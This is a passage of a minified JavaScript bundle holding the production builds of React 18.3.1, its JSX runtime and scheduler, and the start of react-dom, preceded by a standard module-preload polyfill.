function nh(e,n){for(var t=0;t<n.length;t++){const s=n[t];if(typeof s!="string"&&!Array.isArray(s)){for(const r in s)if(r!=="default"&&!(r in e)){const i=Object.getOwnPropertyDescriptor(s,r);i&&Object.defineProperty(e,r,i.get?i:{enumerable:!0,get:()=>s[r]})}}}return Object.freeze(Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}))}(function(){const n=document.createElement("link").relList;if(n&&n.supports&&n.supports("modulepreload"))return;for(const r of document.querySelectorAll('link[rel="modulepreload"]'))s(r);new MutationObserver(r=>{for(const i of r)if(i.type==="childList")for(const a of i.addedNodes)a.tagName==="LINK"&&a.rel==="modulepreload"&&s(a)}).observe(document,{childList:!0,subtree:!0});function t(r){const i={};return r.integrity&&(i.integrity=r.integrity),r.referrerPolicy&&(i.referrerPolicy=r.referrerPolicy),r.crossOrigin==="use-credentials"?i.credentials="include":r.crossOrigin==="anonymous"?i.credentials="omit":i.credentials="same-origin",i}function s(r){if(r.ep)return;r.ep=!0;const i=t(r);fetch(r.href,i)}})();function th(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}var nu={exports:{}},ni={},tu={exports:{}},O={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var As=Symbol.for("react.element"),sh=Symbol.for("react.portal"),rh=Symbol.for("react.fragment"),ih=Symbol.for("react.strict_mode"),ah=Symbol.for("react.profiler"),lh=Symbol.for("react.provider"),oh=Symbol.for("react.context"),ch=Symbol.for("react.forward_ref"),uh=Symbol.for("react.suspense"),ph=Symbol.for("react.memo"),dh=Symbol.for("react.lazy"),uo=Symbol.iterator;function hh(e){return e===null||typeof e!="object"?null:(e=uo&&e[uo]||e["@@iterator"],typeof e=="function"?e:null)}var su={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},ru=Object.assign,iu={};function Pt(e,n,t){this.props=e,this.context=n,this.refs=iu,this.updater=t||su}Pt.prototype.isReactComponent={};Pt.prototype.setState=function(e,n){if(typeof e!="object"&&typeof e!="function"&&e!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,e,n,"setState")};Pt.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,"forceUpdate")};function au(){}au.prototype=Pt.prototype;function il(e,n,t){this.props=e,this.context=n,this.refs=iu,this.updater=t||su}var al=il.prototype=new au;al.constructor=il;ru(al,Pt.prototype);al.isPureReactComponent=!0;var po=Array.isArray,lu=Object.prototype.hasOwnProperty,ll={current:null},ou={key:!0,ref:!0,__self:!0,__source:!0};function cu(e,n,t){var s,r={},i=null,a=null;if(n!=null)for(s in n.ref!==void 0&&(a=n.ref),n.key!==void 0&&(i=""+n.key),n)lu.call(n,s)&&!ou.hasOwnProperty(s)&&(r[s]=n[s]);var l=arguments.length-2;if(l===1)r.children=t;else if(1<l){for(var o=Array(l),c=0;c<l;c++)o[c]=arguments[c+2];r.children=o}if(e&&e.defaultProps)for(s in l=e.defaultProps,l)r[s]===void 0&&(r[s]=l[s]);return{$$typeof:As,type:e,key:i,ref:a,props:r,_owner:ll.current}}function fh(e,n){return{$$typeof:As,type:e.type,key:n,ref:e.ref,props:e.props,_owner:e._owner}}function ol(e){return typeof e=="object"&&e!==null&&e.$$typeof===As}function mh(e){var n={"=":"=0",":":"=2"};return"$"+e.replace(/[=:]/g,function(t){return n[t]})}var ho=/\/+/g;function Ei(e,n){return typeof e=="object"&&e!==null&&e.key!=null?mh(""+e.key):n.toString(36)}function or(e,n,t,s,r){var i=typeof e;(i==="undefined"||i==="boolean")&&(e=null);var a=!1;if(e===null)a=!0;else switch(i){case"string":case"number":a=!0;break;case"object":switch(e.$$typeof){case As:case sh:a=!0}}if(a)return a=e,r=r(a),e=s===""?"."+Ei(a,0):s,po(r)?(t="",e!=null&&(t=e.replace(ho,"$&/")+"/"),or(r,n,t,"",function(c){return c})):r!=null&&(ol(r)&&(r=fh(r,t+(!r.key||a&&a.key===r.key?"":(""+r.key).replace(ho,"$&/")+"/")+e)),n.push(r)),1;if(a=0,s=s===""?".":s+":",po(e))for(var l=0;l<e.length;l++){i=e[l];var o=s+Ei(i,l);a+=or(i,n,t,o,r)}else if(o=hh(e),typeof o=="function")for(e=o.call(e),l=0;!(i=e.next()).done;)i=i.value,o=s+Ei(i,l++),a+=or(i,n,t,o,r);else if(i==="object")throw n=String(e),Error("Objects are not valid as a React child (found: "+(n==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":n)+"). If you meant to render a collection of children, use an array instead.");return a}function Bs(e,n,t){if(e==null)return e;var s=[],r=0;return or(e,s,"","",function(i){return n.call(t,i,r++)}),s}function gh(e){if(e._status===-1){var n=e._result;n=n(),n.then(function(t){(e._status===0||e._status===-1)&&(e._status=1,e._result=t)},function(t){(e._status===0||e._status===-1)&&(e._status=2,e._result=t)}),e._status===-1&&(e._status=0,e._result=n)}if(e._status===1)return e._result.default;throw e._result}var ue={current:null},cr={transition:null},vh={ReactCurrentDispatcher:ue,ReactCurrentBatchConfig:cr,ReactCurrentOwner:ll};function uu(){throw Error("act(...) is not supported in production builds of React.")}O.Children={map:Bs,forEach:function(e,n,t){Bs(e,function(){n.apply(this,arguments)},t)},count:function(e){var n=0;return Bs(e,function(){n++}),n},toArray:function(e){return Bs(e,function(n){return n})||[]},only:function(e){if(!ol(e))throw Error("React.Children.only expected to receive a single React element child.");return e}};O.Component=Pt;O.Fragment=rh;O.Profiler=ah;O.PureComponent=il;O.StrictMode=ih;O.Suspense=uh;O.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=vh;O.act=uu;O.cloneElement=function(e,n,t){if(e==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+e+".");var s=ru({},e.props),r=e.key,i=e.ref,a=e._owner;if(n!=null){if(n.ref!==void 0&&(i=n.ref,a=ll.current),n.key!==void 0&&(r=""+n.key),e.type&&e.type.defaultProps)var l=e.type.defaultProps;for(o in n)lu.call(n,o)&&!ou.hasOwnProperty(o)&&(s[o]=n[o]===void 0&&l!==void 0?l[o]:n[o])}var o=arguments.length-2;if(o===1)s.children=t;else if(1<o){l=Array(o);for(var c=0;c<o;c++)l[c]=arguments[c+2];s.children=l}return{$$typeof:As,type:e.type,key:r,ref:i,props:s,_owner:a}};O.createContext=function(e){return e={$$typeof:oh,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},e.Provider={$$typeof:lh,_context:e},e.Consumer=e};O.createElement=cu;O.createFactory=function(e){var n=cu.bind(null,e);return n.type=e,n};O.createRef=function(){return{current:null}};O.forwardRef=function(e){return{$$typeof:ch,render:e}};O.isValidElement=ol;O.lazy=function(e){return{$$typeof:dh,_payload:{_status:-1,_result:e},_init:gh}};O.memo=function(e,n){return{$$typeof:ph,type:e,compare:n===void 0?null:n}};O.startTransition=function(e){var n=cr.transition;cr.transition={};try{e()}finally{cr.transition=n}};O.unstable_act=uu;O.useCallback=function(e,n){return ue.current.useCallback(e,n)};O.useContext=function(e){return ue.current.useContext(e)};O.useDebugValue=function(){};O.useDeferredValue=function(e){return ue.current.useDeferredValue(e)};O.useEffect=function(e,n){return ue.current.useEffect(e,n)};O.useId=function(){return ue.current.useId()};O.useImperativeHandle=function(e,n,t){return ue.current.useImperativeHandle(e,n,t)};O.useInsertionEffect=function(e,n){return ue.current.useInsertionEffect(e,n)};O.useLayoutEffect=function(e,n){return ue.current.useLayoutEffect(e,n)};O.useMemo=function(e,n){return ue.current.useMemo(e,n)};O.useReducer=function(e,n,t){return ue.current.useReducer(e,n,t)};O.useRef=function(e){return ue.current.useRef(e)};O.useState=function(e){return ue.current.useState(e)};O.useSyncExternalStore=function(e,n,t){return ue.current.useSyncExternalStore(e,n,t)};O.useTransition=function(){return ue.current.useTransition()};O.version="18.3.1";tu.exports=O;var b=tu.exports;const pu=th(b),yh=nh({__proto__:null,default:pu},[b]);/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var wh=b,kh=Symbol.for("react.element"),bh=Symbol.for("react.fragment"),xh=Object.prototype.hasOwnProperty,Sh=wh.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,_h={key:!0,ref:!0,__self:!0,__source:!0};function du(e,n,t){var s,r={},i=null,a=null;t!==void 0&&(i=""+t),n.key!==void 0&&(i=""+n.key),n.ref!==void 0&&(a=n.ref);for(s in n)xh.call(n,s)&&!_h.hasOwnProperty(s)&&(r[s]=n[s]);if(e&&e.defaultProps)for(s in n=e.defaultProps,n)r[s]===void 0&&(r[s]=n[s]);return{$$typeof:kh,type:e,key:i,ref:a,props:r,_owner:Sh.current}}ni.Fragment=bh;ni.jsx=du;ni.jsxs=du;nu.exports=ni;var u=nu.exports,hu={exports:{}},xe={},fu={exports:{}},mu={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(e){function n(A,L){var R=A.length;A.push(L);e:for(;0<R;){var $=R-1>>>1,Q=A[$];if(0<r(Q,L))A[$]=L,A[R]=Q,R=$;else break e}}function t(A){return A.length===0?null:A[0]}function s(A){if(A.length===0)return null;var L=A[0],R=A.pop();if(R!==L){A[0]=R;e:for(var $=0,Q=A.length,zs=Q>>>1;$<zs;){var jn=2*($+1)-1,_i=A[jn],In=jn+1,Fs=A[In];if(0>r(_i,R))In<Q&&0>r(Fs,_i)?(A[$]=Fs,A[In]=R,$=In):(A[$]=_i,A[jn]=R,$=jn);else if(In<Q&&0>r(Fs,R))A[$]=Fs,A[In]=R,$=In;else break e}}return L}function r(A,L){var R=A.sortIndex-L.sortIndex;return R!==0?R:A.id-L.id}if(typeof performance=="object"&&typeof performance.now=="function"){var i=performance;e.unstable_now=function(){return i.now()}}else{var a=Date,l=a.now();e.unstable_now=function(){return a.now()-l}}var o=[],c=[],p=1,d=null,h=3,v=!1,y=!1,w=!1,x=typeof setTimeout=="function"?setTimeout:null,m=typeof clearTimeout=="function"?clearTimeout:null,f=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function g(A){for(var L=t(c);L!==null;){if(L.callback===null)s(c);else if(L.startTime<=A)s(c),L.sortIndex=L.expirationTime,n(o,L);else break;L=t(c)}}function k(A){if(w=!1,g(A),!y)if(t(o)!==null)y=!0,xi(_);else{var L=t(c);L!==null&&Si(k,L.startTime-A)}}function _(A,L){y=!1,w&&(w=!1,m(E),E=-1),v=!0;var R=h;try{for(g(L),d=t(o);d!==null&&(!(d.expirationTime>L)||A&&!se());){var $=d.callback;if(typeof $=="function"){d.callback=null,h=d.priorityLevel;var Q=$(d.expirationTime<=L);L=e.unstable_now(),typeof Q=="function"?d.callback=Q:d===t(o)&&s(o),g(L)}else s(o);d=t(o)}if(d!==null)var zs=!0;else{var jn=t(c);jn!==null&&Si(k,jn.startTime-L),zs=!1}return zs}finally{d=null,h=R,v=!1}}var T=!1,C=null,E=-1,I=5,P=-1;function se(){return!(e.unstable_now()-P<I)}function on(){if(C!==null){var A=e.unstable_now();P=A;var L=!0;try{L=C(!0,A)}finally{L?qe():(T=!1,C=null)}}else T=!1}var qe;if(typeof f=="function")qe=function(){f(on)};else if(typeof MessageChannel<"u"){var co=new MessageChannel,eh=co.port2;co.port1.onmessage=on,qe=function(){eh.postMessage(null)}}else qe=function(){x(on,0)};function xi(A){C=A,T||(T=!0,qe())}function Si(A,L){E=x(function(){A(e.unstable_now())},L)}e.unstable_IdlePriority=5,e.unstable_ImmediatePriority=1,e.unstable_LowPriority=4,e.unstable_NormalPriority=3,e.unstable_Profiling=null,e.unstable_UserBlockingPriority=2,e.unstable_cancelCallback=function(A){A.callback=null},e.unstable_continueExecution=function(){y||v||(y=!0,xi(_))},e.unstable_forceFrameRate=function(A){0>A||125<A?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):I=0<A?Math.floor(1e3/A):5},e.unstable_getCurrentPriorityLevel=function(){return h},e.unstable_getFirstCallbackNode=function(){return t(o)},e.unstable_next=function(A){switch(h){case 1:case 2:case 3:var L=3;break;default:L=h}var R=h;h=L;try{return A()}finally{h=R}},e.unstable_pauseExecution=function(){},e.unstable_requestPaint=function(){},e.unstable_runWithPriority=function(A,L){switch(A){case 1:case 2:case 3:case 4:case 5:break;default:A=3}var R=h;h=A;try{return L()}finally{h=R}},e.unstable_scheduleCallback=function(A,L,R){var $=e.unstable_now();switch(typeof R=="object"&&R!==null?(R=R.delay,R=typeof R=="number"&&0<R?$+R:$):R=$,A){case 1:var Q=-1;break;case 2:Q=250;break;case 5:Q=1073741823;break;case 4:Q=1e4;break;default:Q=5e3}return Q=R+Q,A={id:p++,callback:L,priorityLevel:A,startTime:R,expirationTime:Q,sortIndex:-1},R>$?(A.sortIndex=R,n(c,A),t(o)===null&&A===t(c)&&(w?(m(E),E=-1):w=!0,Si(k,R-$))):(A.sortIndex=Q,n(o,A),y||v||(y=!0,xi(_))),A},e.unstable_shouldYield=se,e.unstable_wrapCallback=function(A){var L=h;return function(){var R=h;h=L;try{return A.apply(this,arguments)}finally{h=R}}}})(mu);fu.exports=mu;var Eh=fu.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Th=b,be=Eh;function S(e){for(var n="https://reactjs.org/docs/error-decoder.html?invariant="+e,t=1;t<arguments.length;t++)n+="&args[]="+encodeURIComponent(arguments[t]);return"Minified React error #"+e+"; visit "+n+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var gu=new Set,as={};function Zn(e,n){bt(e,n),bt(e+"Capture",n)}function bt(e,n){for(as[e]=n,e=0;e<n.length;e++)gu.add(n[e])}var nn=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),ta=Object.prototype.hasOwnProperty,Ch=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,fo={},mo={};function Nh(e){return ta.call(mo,e)?!0:ta.call(fo,e)?!1:Ch.test(e)?mo[e]=!0:(fo[e]=!0,!1)}function Ah(e,n,t,s){if(t!==null&&t.type===0)return!1;switch(typeof n){case"function":case"symbol":return!0;case"boolean":return s?!1:t!==null?!t.acceptsBooleans:(e=e.toLowerCase().slice(0,5),e!=="data-"&&e!=="aria-");default:return!1}}function Ph(e,n,t,s){if(n===null||typeof n>"u"||Ah(e,n,t,s))return!0;if(s)return!1;if(t!==null)switch(t.type){case 3:return!n;case 4:return n===!1;case 5:return isNaN(n);case 6:return isNaN(n)||1>n}return!1}function pe(e,n,t,s,r,i,a){this.acceptsBooleans=n===2||n===3||n===4,this.attributeName=s,this.attributeNamespace=r,this.mustUseProperty=t,this.propertyName=e,this.type=n,this.sanitizeURL=i,this.removeEmptyString=a}var te={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e){te[e]=new pe(e,0,!1,e,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(e){var n=e[0];te[n]=new pe(n,1,!1,e[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(e){te[e]=new pe(e,2,!1,e.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(e){te[e]=new pe(e,2,!1,e,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e){te[e]=new pe(e,3,!1,e.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(e){te[e]=new pe(e,3,!0,e,null,!1,!1)});["capture","download"].forEach(function(e){te[e]=new pe(e,4,!1,e,null,!1,!1)});["cols","rows","size","span"].forEach(function(e){te[e]=new pe(e,6,!1,e,null,!1,!1)});["rowSpan","start"].forEach(function(e){te[e]=new pe(e,5,!1,e.toLowerCase(),null,!1,!1)});var cl=/[\-:]([a-z])/g;function ul(e){return e[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e){var n=e.replace(cl,ul);te[n]=new pe(n,1,!1,e,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e){var n=e.replace(cl,ul);te[n]=new pe(n,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(e){var n=e.replace(cl,ul);te[n]=new pe(n,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(e){te[e]=new pe(e,1,!1,e.toLowerCase(),null,!1,!1)});te.xlinkHref=new pe("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(e){te[e]=new pe(e,1,!1,e.toLowerCase(),null,!0,!0)});function pl(e,n,t,s){var r=te.hasOwnProperty(n)?te[n]:null;(r!==null?r.type!==0:s||!(2<n.length)||n[0]!=="o"&&n[0]!=="O"||n[1]!=="n"&&n[1]!=="N")&&(Ph(n,t,r,s)&&(t=null),s||r===null?Nh(n)&&(t===null?e.removeAttribute(n):e.setAttribute(n,""+t)):r.mustUseProperty?e[r.propertyName]=t===null?r.type===3?!1:"":t:(n=r.attributeName,s=r.attributeNamespace,t===null?e.removeAttribute(n):(r=r.type,t=r===3||r===4&&t===!0?"":""+t,s?e.setAttributeNS(s,n,t):e.setAttribute(n,t))))}var ln=Th.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,Us=Symbol.for("react.element"),tt=Symbol.for("react.portal"),st=Symbol.for("react.fragment"),dl=Symbol.for("react.strict_mode"),sa=Symbol.for("react.profiler"),vu=Symbol.for("react.provider"),yu=Symbol.for("react.context"),hl=Symbol.for("react.forward_ref"),ra=Symbol.for("react.suspense"),ia=Symbol.for("react.suspense_list"),fl=Symbol.for("react.memo"),pn=Symbol.for("react.lazy"),wu=Symbol.for("react.offscreen"),go=Symbol.iterator;function jt(e){return e===null||typeof e!="object"?null:(e=go&&e[go]||e["@@iterator"],typeof e=="function"?e:null)}var V=Object.assign,Ti;function Vt(e){if(Ti===void 0)try{throw Error()}catch(t){var n=t.stack.trim().match(/\n( *(at )?)/);Ti=n&&n[1]||""}return`
`+Ti+e}var Ci=!1;function Ni(e,n){if(!e||Ci)return"";Ci=!0;var t=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(n)if(n=function(){throw Error()},Object.defineProperty(n.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(n,[])}catch(c){var s=c}Reflect.construct(e,[],n)}else{try{n.call()}catch(c){s=c}e.call(n.prototype)}else{try{throw Error()}catch(c){s=c}e()}}catch(c){if(c&&s&&typeof c.stack=="string"){for(var r=c.stack.split(`
`),i=s.stack.split(`
`),a=r.length-1,l=i.length-1;1<=a&&0<=l&&r[a]!==i[l];)l--;for(;1<=a&&0<=l;a--,l--)if(r[a]!==i[l]){if(a!==1||l!==1)do if(a--,l--,0>l||r[a]!==i[l]){var o=`
`+r[a].replace(" at new "," at ");return e.displayName&&o.includes("<anonymous>")&&(o=o.replace("<anonymous>",e.displayName)),o}while(1<=a&&0<=l);break}}}finally{Ci=!1,Error.prepareStackTrace=t}return(e=e?e.displayName||e.name:"")?Vt(e):""}function Lh(e){switch(e.tag){case 5:return Vt(e.type);case 16:return Vt("Lazy");case 13:return Vt("Suspense");case 19:return Vt("SuspenseList");case 0:case 2:case 15:return e=Ni(e.type,!1),e;case 11:return e=Ni(e.type.render,!1),e;case 1:return e=Ni(e.type,!0),e;default:return""}}function aa(e){if(e==null)return null;if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case st:return"Fragment";case tt:return"Portal";case sa:return"Profiler";case dl:return"StrictMode";case ra:return"Suspense";case ia:return"SuspenseList"}if(typeof e=="object")switch(e.$$typeof){case yu:return(e.displayName||"Context")+".Consumer";case vu:return(e._context.displayName||"Context")+".Provider";case hl:var n=e.render;return e=e.displayName,e||(e=n.displayName||n.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case fl:return n=e.displayName||null,n!==null?n:aa(e.type)||"Memo";case pn:n=e._payload,e=e._init;try{return aa(e(n))}catch{}}return null}function Rh(e){var n=e.type;switch(e.tag){case 24:return"Cache";case 9:return(n.displayName||"Context")+".Consumer";case 10:return(n._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return e=n.render,e=e.displayName||e.name||"",n.displayName||(e!==""?"ForwardRef("+e+")":"ForwardRef");case 7:return"Fragment";case 5:return n;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return aa(n);case 8:return n===dl?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof n=="function")return n.displayName||n.name||null;if(typeof n=="string")return n}return null}function Nn(e){switch(typeof e){case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function ku(e){var n=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(n==="checkbox"||n==="radio")}function Oh(e){var n=ku(e)?"checked":"value",t=Object.getOwnPropertyDescriptor(e.constructor.prototype,n),s=""+e[n];if(!e.hasOwnProperty(n)&&typeof t<"u"&&typeof t.get=="function"&&typeof t.set=="function"){var r=t.get,i=t.set;return Object.defineProperty(e,n,{configurable:!0,get:function(){return r.call(this)},set:function(a){s=""+a,i.call(this,a)}}),Object.defineProperty(e,n,{enumerable:t.enumerable}),{getValue:function(){return s},setValue:function(a){s=""+a},stopTracking:function(){e._valueTracker=null,delete e[n]}}}}function Hs(e){e._valueTracker||(e._valueTracker=Oh(e))}function bu(e){if(!e)return!1;var n=e._valueTracker;if(!n)return!0;var t=n.getValue(),s="";return e&&(s=ku(e)?e.checked?"true":"false":e.value),e=s,e!==t?(n.setValue(e),!0):!1}function Sr(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}function la(e,n){var t=n.checked;return V({},n,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:t??e._wrapperState.initialChecked})}function vo(e,n){var t=n.defaultValue==null?"":n.defaultValue,s=n.checked!=null?n.checked:n.defaultChecked;t=Nn(n.value!=null?n.value:t),e._wrapperState={initialChecked:s,initialValue:t,controlled:n.type==="checkbox"||n.type==="radio"?n.checked!=null:n.value!=null}}function xu(e,n){n=n.checked,n!=null&&pl(e,"checked",n,!1)}function oa(e,n){xu(e,n);var t=Nn(n.value),s=n.type;if(t!=null)s==="number"?(t===0&&e.value===""||e.value!=t)&&(e.value=""+t):e.value!==""+t&&(e.value=""+t);else if(s==="submit"||s==="reset"){e.removeAttribute("value");return}n.hasOwnProperty("value")?ca(e,n.type,t):n.hasOwnProperty("defaultValue")&&ca(e,n.type,Nn(n.defaultValue)),n.checked==null&&n.defaultChecked!=null&&(e.defaultChecked=!!n.defaultChecked)}function yo(e,n,t){if(n.hasOwnProperty("value")||n.hasOwnProperty("defaultValue")){var s=n.type;if(!(s!=="submit"&&s!=="reset"||n.value!==void 0&&n.value!==null))return;n=""+e._wrapperState.initialValue,t||n===e.value||(e.value=n),e.defaultValue=n}t=e.name,t!==""&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,t!==""&&(e.name=t)}function ca(e,n,t){(n!=="number"||Sr(e.ownerDocument)!==e)&&(t==null?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+t&&(e.defaultValue=""+t))}var Wt=Array.isArray;function ft(e,n,t,s){if(e=e.options,n){n={};for(var r=0;r<t.length;r++)n["$"+t[r]]=!0;for(t=0;t<e.length;t++)r=n.hasOwnProperty("$"+e[t].value),e[t].selected!==r&&(e[t].selected=r),r&&s&&(e[t].defaultSelected=!0)}else{for(t=""+Nn(t),n=null,r=0;r<e.length;r++){if(e[r].value===t){e[r].selected=!0,s&&(e[r].defaultSelected=!0);return}n!==null||e[r].disabled||(n=e[r])}n!==null&&(n.selected=!0)}}function ua(e,n){if(n.dangerouslySetInnerHTML!=null)throw Error(S(91));return V({},n,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function wo(e,n){var t=n.value;if(t==null){if(t=n.children,n=n.defaultValue,t!=null){if(n!=null)throw Error(S(92));if(Wt(t)){if(1<t.length)throw Error(S(93));t=t[0]}n=t}n==null&&(n=""),t=n}e._wrapperState={initialValue:Nn(t)}}function Su(e,n){var t=Nn(n.value),s=Nn(n.defaultValue);t!=null&&(t=""+t,t!==e.value&&(e.value=t),n.defaultValue==null&&e.defaultValue!==t&&(e.defaultValue=t)),s!=null&&(e.defaultValue=""+s)}function ko(e){var n=e.textContent;n===e._wrapperState.initialValue&&n!==""&&n!==null&&(e.value=n)}function _u(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function pa(e,n){return e==null||e==="http://www.w3.org/1999/xhtml"?_u(n):e==="http://www.w3.org/2000/svg"&&n==="foreignObject"?"http://www.w3.org/1999/xhtml":e}var Vs,Eu=function(e){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(n,t,s,r){MSApp.execUnsafeLocalFunction(function(){return e(n,t,s,r)})}:e}(function(e,n){if(e.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in e)e.innerHTML=n;else{for(Vs=Vs||document.createElement("div"),Vs.innerHTML="<svg>"+n.valueOf().toString()+"</svg>",n=Vs.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;n.firstChild;)e.appendChild(n.firstChild)}});function ls(e,n){if(n){var t=e.firstChild;if(t&&t===e.lastChild&&t.nodeType===3){t.nodeValue=n;return}}e.textContent=n}var Qt={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},jh=["Webkit","ms","Moz","O"];Object.keys(Qt).forEach(function(e){jh.forEach(function(n){n=n+e.charAt(0).toUpperCase()+e.substring(1),Qt[n]=Qt[e]})});function Tu(e,n,t){return n==null||typeof n=="boolean"||n===""?"":t||typeof n!="number"||n===0||Qt.hasOwnProperty(e)&&Qt[e]?(""+n).trim():n+"px"}function Cu(e,n){e=e.style;for(var t in n)if(n.hasOwnProperty(t)){var s=t.indexOf("--")===0,r=Tu(t,n[t],s);t==="float"&&(t="cssFloat"),s?e.setProperty(t,r):e[t]=r}}var Ih=V({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function da(e,n){if(n){if(Ih[e]&&(n.children!=null||n.dangerouslySetInnerHTML!=null))throw Error(S(137,e));if(n.dangerouslySetInnerHTML!=null){if(n.children!=null)throw Error(S(60));if(typeof 